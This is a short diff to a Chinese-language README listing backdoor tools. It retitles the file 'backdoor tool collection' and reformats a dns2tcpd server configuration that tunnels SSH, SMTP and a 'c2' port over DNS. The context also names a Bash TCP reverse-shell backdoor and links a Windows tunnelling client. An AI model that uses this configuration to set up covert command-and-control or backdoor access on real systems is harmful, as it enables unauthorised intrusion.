@@ -1,4 +1,4 @@
-# backdoor
+# backdoor工具收藏
 
 ****************************************************
 1、 Bash TCP反弹后门<br>
@@ -86,12 +86,12 @@ https://3hack.com/tools/85.html<br>
 设置A记录 dns28.xxx.com到Kail<br>
 服务端设置<br>
 cat /etc/dns2tcpd.conf<br>
-listen = 0.0.0.0<br>
+`listen = 0.0.0.0<br>
 port = 53<br>
 user = nobody<br>
 chroot = /tmp<br>
 domain = dns28.xxx.com<br>
-resources = c2:127.0.0.1:5353 , ssh:127.0.0.1:22 , smtp:127.0.0.1:25<br>
+resources = c2:127.0.0.1:5353 , ssh:127.0.0.1:22 , smtp:127.0.0.1:25`<br>
 服务端运行：root@kali:~# dns2tcpd -f /etc/dns2tcpd.conf -F -d 1<br><br>
 https://github.com/synjkc/backdoor/blob/master/dns2tcpc_client_win.zip<br>
 客户端运行：<br>
